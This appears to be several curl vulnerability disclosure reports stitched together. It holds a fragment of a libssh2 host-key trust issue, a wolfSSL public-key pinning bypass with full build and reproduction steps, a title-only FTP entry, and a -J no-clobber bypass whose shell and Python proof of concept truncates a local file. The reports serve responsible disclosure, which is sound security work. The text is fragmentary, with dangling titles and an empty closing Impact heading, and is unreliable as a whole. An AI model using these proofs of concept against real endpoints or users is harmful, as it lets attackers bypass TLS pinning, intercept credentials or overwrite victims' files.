This is a separate libssh2 root from CVE-2026-9547, whose advisory says libssh2 is unaffected; I used AI to assist the source audit and drafting, then personally reran the exact-release, current-master, control, and fixed-control tests.

## Impact

A network attacker who controls or intercepts the reached SSH endpoint can make an already pinned host appear genuinely new to a trust-on-first-use callback. Libcurl then authenticates to the hostile endpoint; in the proof, the server receives the configured SSH password and libcurl accepts attacker-controlled SFTP data. The default callback and curl command-line tool are not claimed affected.

title: CVE-2026-87866: wolfSSL public-key pinning bypass
vulnerability_information:
## Summary

curl 8.22.0 built with wolfSSL can accept a `CURLOPT_PINNEDPUBLICKEY` hash for a key the TLS peer does not possess.

wolfSSL completes the TLS handshake using public key **A** from a malformed certificate. curl then reparses the same DER using `Curl_parseX509()` and, because of a manipulated `validity` length, selects embedded SPKI **B**.

The server has only private key **A**, but pin **B** is accepted and curl sends the HTTP request.

This is not a CA-validation claim. The PoC uses curl's documented pinning-only mode (`-k` with `--pinnedpubkey`), where the public-key pin must still be verified independently.

## Steps To Reproduce

Prerequisites: `git`, `curl`, `unzip`, `openssl`, `clang`/`clang++`, `make`, Autotools, `pkg-config`, and zlib development headers.

1. Extract the attached bundle and prepare isolated paths:

```sh
unzip SUBMISSION-CURL-WOLFSSL-X509-PIN-BYPASS-20260902-H1-FINAL.zip

POC_DIR="$(pwd)/wolfssl-x509-pin-bypass"
REPRO_ROOT="$(mktemp -d)"
WOLFSSL_PREFIX="$REPRO_ROOT/wolfssl-install"
```

2. Build wolfSSL 5.9.2:

```sh
git clone --depth 1 --branch v5.9.2-stable \
  https://github.com/wolfSSL/wolfssl.git "$REPRO_ROOT/wolfssl"

cd "$REPRO_ROOT/wolfssl"
./autogen.sh

CC=clang \
CFLAGS='-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined' \
LDFLAGS='-fsanitize=address,undefined' \
./configure --prefix="$WOLFSSL_PREFIX" \
  --enable-tls13 --enable-harden --enable-ed25519 \
  --enable-sessioncerts --enable-opensslextra \
  --disable-benchmark --disable-crypttests

make -j"$(nproc)"
make install
```

3. Download, verify, and build curl 8.22.0:

```sh
cd "$REPRO_ROOT"

curl -LO https://curl.se/download/curl-8.22.0.tar.xz

printf '%s  %s\n' \
  f7ef3ae8a22e521f289803fe93543eb64c329b58aa73a9e224dfd915a2a5f4f7 \
  curl-8.22.0.tar.xz | sha256sum -c -

tar -xf curl-8.22.0.tar.xz
cd curl-8.22.0

CC=clang \
CFLAGS='-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined' \
CPPFLAGS="-I$WOLFSSL_PREFIX/include" \
LDFLAGS="-L$WOLFSSL_PREFIX/lib -Wl,-rpath,$WOLFSSL_PREFIX/lib -fsanitize=address,undefined" \
./configure --with-wolfssl="$WOLFSSL_PREFIX" \
  --without-libpsl --without-brotli --without-zstd --without-nghttp2 \
  --enable-debug --disable-shared

make -j"$(nproc)"
```

4. Run the end-to-end attack and controls:

```sh
CURL_BIN="$REPRO_ROOT/curl-8.22.0/src/curl" \
WOLFSSL_SRC="$REPRO_ROOT/wolfssl" \
"$POC_DIR/poc/reproduce.sh"
```

Expected:

```text
malformed A + pin B -> exit 0, HTTP 200, canary GET received
malformed A + pin A -> exit 90, HTTP 000, no request
valid A + pin A     -> exit 0, HTTP 200, canary GET received
valid A + pin B     -> exit 90, HTTP 000, no request

PASS: attack case and all three negative controls matched expectations
```

The server uses `poc/key-a.pem` only. No private key corresponding to pin B is provided to the server.

5. Confirm that both parsers select different public keys from the same certificate DER:

```sh
CURL_BUILD="$REPRO_ROOT/curl-8.22.0" \
WOLFSSL_PREFIX="$WOLFSSL_PREFIX" \
"$POC_DIR/poc/run-differential.sh"
```

Expected:

```text
X509_DIFF der=285 curl_off=136 curl_len=44 backend_off=77 backend_len=44 input_equal=1
CURL_SPKI_SHA256=97b8b62490b44349d24429bcf466c2023933c3e3b206465cf7f2a819e53f3a1b
BACKEND_SPKI_SHA256=c5683b7ecce8c958e929f718afa669fedfcaf1013cdea29ab9162327213a2bbe

PASS: the same DER maps to backend SPKI A and curl SPKI B
```

## Attachments

`SUBMISSION-CURL-WOLFSSL-X509-PIN-BYPASS-20260902-H1-FINAL.zip`

## Impact

An attacker controlling a TLS endpoint, but not possessing the pinned private key, can make wolfSSL-backed curl accept the connection as matching that pin and receive the application request sent after the bypass.

This breaks the authentication guarantee of curl's public-key pinning mechanism.

title: CVE-2026-92388: FTP wildcard write callback mixup
CVE-2026-92390: -J no-clobber guarantee bypassed with 103 early hints
vulnerability_information:
Hi all,

I found a way for a server to defeat `--remote-header-name`'s (`-J`) no-clobber guarantee: with `curl -O -J -i`, sending a `103 Early Hints` before the final response (or an `ETag` ahead of `Content-Disposition` under `--etag-save`) lets a server overwrite an existing file it names via `Content-Disposition`, even though `-J` documents that exact case as protected.

This is a post-CVE-2020-8177 variant of the same `-J` plus `-i` header-overwrite class. The earlier flaw was fixed in curl 7.71.0; this case reaches the same unsafe state through informational-response and `--etag-save` header ordering after support for combining `-J` with displayed headers was added.

## Why it happens

`-J` promises not to overwrite an existing server-selected filename ([documented here](https://curl.se/docs/manpage.html#--remote-header-name)). Curl waits for a usable `Content-Disposition` header, or the 8.19.0 redirect `Location` fallback, before applying that check.

With `-i`, curl normally buffers displayed headers while it waits for the filename. However, the displayed-header path still opens the output file for an HTTP 1xx response such as `103 Early Hints`. The same happens for an `ETag` line when `--etag-save` handles it before `Content-Disposition`. That early open uses the normal truncating mode on the URL-derived filename.

When the final `Content-Disposition` arrives, curl sees that the output stream is already open and aborts. The protected no-clobber open is never reached, but the URL-derived file has already been truncated. If the URL is `.../victim.txt` and the server names `victim.txt`, this is the exact file that `-J` promises to protect.

This also matches RFC 8297's requirement that Early Hints must not affect final-response processing. See [RFC 8297](https://datatracker.ietf.org/doc/rfc8297/).

## PoC

Server sends `103 Early Hints`, then a final response whose `Content-Disposition` filename is identical to the URL basename and to a pre-existing local file. Control: same server, same file, no `103`.

```sh
#!/bin/sh
# Reproduces AISLE-2026-0115-00244: curl -O -J -i lets a server's 103 Early
# Hints defeat -J's O_EXCL no-clobber protection when Content-Disposition
# names the same file as the URL basename.
set -e
MODE="$1"   # exploit (103 first) | control (no 103)
PORT="${VF_PORT:-18080}"
WORK="${VF_WORK:-/tmp/vf-j-noclob}"
mkdir -p "$WORK"; cd "$WORK"
printf 'ORIGINAL-VICTIM-CONTENT-DO-NOT-DELETE\n' > victim.txt

python3 -c "
import socket, time
mode = '$MODE'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('127.0.0.1', $PORT)); s.listen(1)
c, _ = s.accept()
c.recv(65536)
if mode == 'exploit':
    c.sendall(b'HTTP/1.1 103 Early Hints\r\n\r\n')
    time.sleep(0.1)
body = b'ATTACKER-CONTROLLED-BODY\n'
# Content-Disposition filename matches the URL basename on purpose.
c.sendall(b'HTTP/1.1 200 OK\r\nContent-Disposition: attachment; filename=\"victim.txt\"\r\n'
          b'Content-Length: ' + str(len(body)).encode() + b'\r\n\r\n' + body)
" &
sleep 0.3

rc=0
curl -sS -O -J -i "http://127.0.0.1:$PORT/victim.txt" || rc=$?
wait
echo "mode=$MODE rc=$rc victim=[$(cat victim.txt)]"
```

Measured with the local `curl 8.22.1-DEV` build; the same relevant code is present at `curl-8_22_0`:

```
mode=control rc=23 victim=[ORIGINAL-VICTIM-CONTENT-DO-NOT-DELETE]
mode=exploit rc=23 victim=[HTTP/1.1 103 Early Hints
]
```

Same server-chosen filename, same pre-existing file, same final response — the only difference is the `103` arriving first. `control` shows the guarantee working: curl refuses to touch `victim.txt` and exits with an error. `exploit` shows it defeated: the file is truncated and replaced with header text before curl ever gets to the check that was supposed to protect it. `--no-clobber` preserves the original file in both cases, although it may create a numbered sibling such as `victim.txt.1` and the transfer still exits with error 23, so it is a working mitigation in the meantime.

## Suggested direction

Header display needs to be held back the same way `Content-Disposition` parsing already is, for as long as `honor_cd_filename` is active: buffer displayed headers from informational responses and the `--etag-save` `ETag` line until the filename decision is final, then open exactly one path with its correct clobber mode. The implementation must continue to parse filename-bearing headers only from the applicable 2xx/3xx response block; RFC 8297 states that 103 headers must not affect final-response processing. A regression test wants a `103` (or an `ETag`-before-`Content-Disposition` response under `--etag-save`) naming the same file as the URL basename, asserting the pre-existing file survives. See [RFC 8297](https://datatracker.ietf.org/doc/rfc8297/).

Preconditions: curl's command-line tool invoked with `-O -J -i`, default clobber mode, an HTTP server able to send an informational response or an early `ETag` before its applicable `Content-Disposition`, and a pre-existing local file matching the name the server chooses.

Cheers,  
Josh

## Impact
